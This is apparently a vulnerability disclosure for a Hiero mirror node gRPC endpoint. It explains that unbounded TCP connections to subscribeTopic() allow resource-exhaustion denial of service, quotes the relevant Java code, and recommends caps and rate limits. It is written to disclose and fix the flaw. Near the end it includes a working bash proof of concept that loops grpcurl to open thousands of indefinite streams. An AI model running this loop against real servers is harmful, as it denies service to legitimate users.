### Title
Unbounded Total gRPC Connection Count Enables Resource Exhaustion via `subscribeTopic()` Stream Flooding

### Summary
`ConsensusController.subscribeTopic()` imposes no authentication, no per-IP connection limit, and no global subscriber cap. The only enforced guard is `maxConcurrentCallsPerConnection = 5`, which is scoped per TCP connection. An unprivileged attacker can open an unbounded number of TCP connections ג€” each carrying up to 5 indefinite streaming subscriptions ג€” exhausting Reactor scheduler threads, R2DBC/Redis listener slots, and JVM heap, degrading or denying service to all legitimate subscribers.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (lines 43ג€“53) accepts any `ConsensusTopicQuery` with no authentication check and no global concurrency gate:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java:43-53
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)
            ...
            .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
    if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
        serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
    }
}
```

Each call unconditionally creates a live `TopicContext`, a historical retriever `Flux`, a live listener `Flux`, and a safety-check `Flux` on `Schedulers.boundedElastic()`.

**The only enforced cap:**

`NettyProperties.maxConcurrentCallsPerConnection = 5` (default), applied in `GrpcConfiguration`:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java:33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

This is a **per-TCP-connection** limit. There is no limit on the number of TCP connections from a single IP or globally. No `maxConnections`, no `maxConnectionAge`, no IP-rate-limit is configured.

**`subscriberCount` is metric-only, never gated:**

```java
// grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java:48,89-90
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

It is registered as a Micrometer gauge only ג€” never checked against a maximum before accepting a new subscription.

**The only interceptor** (`GrpcInterceptor`) only sets an endpoint context label; it performs no rate limiting or connection counting.

**Exploit flow:**

1. Attacker opens `N` TCP connections to port 5600 (no auth required).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streams with `limit=0` (indefinite) and a valid or non-existent topic ID (with `checkTopicExists=false` or any existing topic).
3. Each stream allocates: a `TopicContext`, a `Flux` chain on `boundedElastic`, a Redis/poll listener slot, and R2DBC query state.
4. With `N=2000` connections: 10,000 concurrent live subscriptions, each holding JVM memory and scheduler threads.
5. `boundedElastic` scheduler has a bounded thread pool; once saturated, new legitimate subscriptions queue indefinitely or are rejected.

### Impact Explanation

- **Memory exhaustion**: Each `TopicContext` + Reactor chain + prefetch buffer (up to `maxBufferSize=16384` messages) consumes significant heap per stream.
- **Scheduler starvation**: `Schedulers.boundedElastic()` has a default cap of `10 ֳ— CPU cores` threads; the safety-check `Flux` for each subscription runs on this pool.
- **Redis/DB connection pool exhaustion**: Each live listener consumes a Redis pub/sub channel or a polling DB connection slot.
- **Result**: Legitimate subscribers receive no messages or connection-refused errors; the gRPC service becomes unavailable.

Severity matches the stated scope: griefing/DoS with service degradation, no economic damage.

### Likelihood Explanation

- Requires zero privileges, zero credentials, zero prior knowledge beyond the public gRPC endpoint and proto definition (published in the repo).
- A single attacker machine with a standard gRPC client library (e.g., `grpcurl` in a loop, or a Go/Java client) can open thousands of TCP connections trivially.
- The attack is repeatable and persistent as long as the attacker holds connections open.
- No CAPTCHA, no API key, no IP block is enforced at the gRPC layer.

### Recommendation

1. **Add a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable maximum and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add a per-IP connection limit** in `GrpcConfiguration` using Netty's `maxConnectionsPerIp` or a custom `ServerInterceptor` that tracks active streams per remote address.
3. **Configure `maxConnectionAge`** on the Netty server builder to recycle long-lived connections and prevent indefinite stream holding.
4. **Deploy an external rate-limiter** (e.g., Envoy, nginx `limit_conn`) in front of port 5600 to cap connections per source IP.

### Proof of Concept

```bash
# Open 500 connections ֳ— 5 streams = 2500 concurrent indefinite subscriptions
# Requires grpcurl and a valid topic ID (or checkTopicExists=false)
for i in $(seq 1 500); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID": {"topicNum": 41110}, "limit": 0}' \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# Observe: subscriberCount metric climbs to 2500
# Observe: boundedElastic thread pool saturated
# Observe: legitimate new subscriptions hang or fail with UNAVAILABLE
```

**Preconditions:** Network access to port 5600; knowledge of any valid topic ID (or `checkTopicExists=false` in config). No credentials required.
**Expected result:** Server-side resource exhaustion; legitimate subscribers experience degraded or no service.
